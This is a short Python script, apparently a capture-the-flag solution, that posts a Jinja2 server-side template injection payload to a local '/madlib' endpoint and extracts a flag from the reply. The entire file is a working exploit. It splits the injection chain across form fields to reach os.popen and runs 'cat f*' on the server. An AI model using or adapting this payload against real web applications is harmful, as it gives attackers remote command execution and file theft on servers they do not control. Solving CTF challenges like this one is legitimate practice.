import requests
import re

host = 'localhost'
port = '10000'

url = f'http://{host}:{port}/madlib'

payload = {
        "verb":"{%set x=cycler%}",
        "noun":"{%set x=x.__init__%}",
        "adjective":"{%set x=x.__globals__",
        "person":"os.popen('cat f*')%}",
        "place":"{{x.read()}}"
        }

r = requests.post(url, json=payload)

flag = re.findall(r'DO{.*}', r.text)[0]

print(flag)
